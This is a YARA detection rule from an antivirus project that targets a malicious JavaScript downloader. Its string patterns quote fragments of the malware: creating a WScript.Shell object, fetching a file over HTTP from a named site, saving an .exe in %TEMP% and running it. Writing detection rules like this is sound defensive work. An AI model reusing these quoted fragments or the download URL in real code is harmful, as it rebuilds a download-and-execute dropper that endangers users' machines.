rule sig_20160328_1194d9032bbe6c7f33d089d8dfe59859 {
  meta:
    description = "datamaliciousorder - file 20160328_1194d9032bbe6c7f33d089d8dfe59859.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27f7c584556b2aac705af3197784ca03bbad59043b2aad9becd768129e9848e8"

  strings:
    $s1  = "function Amyccpz() {return Woclb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9ZFftwP3LKIsLI.exe\";};" fullword ascii
    $s2  = "do {WScript[Geeas](Vndnxok() * 11)} while (Rlwxmzpue[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Vkagievfbq(Zqele, Tuwylgpavz){return Zqele - Tuwylgpavz;};" fullword ascii
    $s4  = "var Woclb = function Rtmxbdefy() {return WScript[Alnnhicgdz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Rlwxmzpue[Bigecxmmq](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Ieekuzu(Udewylcu){Woclb[\"Run\"](Udewylcu, Hiwgv, Hiwgv);};" fullword ascii
    $s7  = "function Gixfcbvkxy() {return ((Ymmfas == true) && (Ymmfas == Gvrafoovm)) ? 1 : Hiwgv;};" fullword ascii
    $s8  = "function Lqvnbhntsy(){return Dofqge;};" fullword ascii
    $s9  = "Gvrafoovm = true; " fullword ascii
    $s10 = "var Pyykbnq = false;" fullword ascii
    $s11 = " while (Qackncc){" fullword ascii
    $s12 = "return Vkagievfbq(Acocqpl, Biqnywbol);" fullword ascii
    $s13 = "function Splqacehfq()" fullword ascii
    $s14 = "function Vndnxok(){return 22;};" fullword ascii
    $s15 = "function Idmxad(Cbrhox) {var Izzbrhp = (1, 2, 3, 4, 5, Cbrhox); return Izzbrhp;};" fullword ascii
    $s16 = "function Nfxbyotozq(){return Alnnhicgdz;};" fullword ascii
    $s17 = "var Wxkyk = new this[\"Date\"]();" fullword ascii
    $s18 = "var Gvrafoovm = false;" fullword ascii
    $s19 = "var Ymmfas = false;" fullword ascii
    $s20 = "Ymmfas = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}